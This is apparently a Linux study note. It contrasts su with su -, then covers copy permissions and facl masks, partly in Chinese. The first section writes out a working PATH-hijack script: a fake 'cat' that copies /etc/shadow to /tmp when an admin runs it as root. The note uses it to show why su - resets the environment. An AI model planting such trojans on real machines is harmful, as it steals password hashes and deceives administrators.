
su - invokes a login shell after switching the user. A login shell resets most environment variables, providing a clean base.

su just switches the user, providing a normal shell with an environment nearly the same as with the old user.

Imagine, you're a software developer with normal user access to a machine and your ignorant admin just won't give you root access. Let's (hopefully) trick him.
```bash
$ mkdir /tmp/evil_bin
$ vi /tmp/evil_bin/cat
#!/bin/bash
test $UID != 0 && { echo "/bin/cat: Permission denied!"; exit 1; }
/bin/cat /etc/shadow &>/tmp/shadow_copy
/bin/cat "$@"
exit 0

$ chmod +x /tmp/evil_bin/cat
$ PATH="/tmp/evil_bin:$PATH"
```
Now, you ask your admin why you can't cat the dummy file in your home folder, it just won't work!

```bash
$ ls -l /home/you/dummy_file
-rw-r--r-- 1 you wheel 41 2011-02-07 13:00 dummy_file
$ cat /home/you/dummy_file
/bin/cat: Permission denied!
```

If your admin isn't that smart or just a bit lazy, he might come to your desk and try with his super-user powers:

```bash
$ su
Password: ...
# cat /home/you/dummy_file
Some important dummy stuff in that file.
# exit
Wow! Thanks, super admin!

$ ls -l /tmp/shadow_copy
-rw-r--r-- 1 root root 1093 2011-02-07 13:02 /tmp/shadow_copy
```
He, he.

You maybe noticed that the corrupted $PATH variable was not reset. This wouldn't have happened, if the admin invoked su - instead.
```


```bash
38、/etc/fstab复制到/data/dir，至少需要什么权限？ 
1）cp命令 有执行权限 
2）/etc目录有执行权限，fstab读权限 
3）/data目录有执行权限，dir目录有执行和写权限
```


- facl中：mask 用来设置除所有者和other以外的用户或组的权限
- 一旦设置了facl，所看到的的组权限实际是mask权限，使用chmod更改组权限实际是更改mask权限。


```
[root@centos7 /data/test]$getfacl issue.bak 
# file: issue.bak
# owner: root
# group: root
user::rw-
user:steve:rw-
group::---
mask::rw-
other::---
```
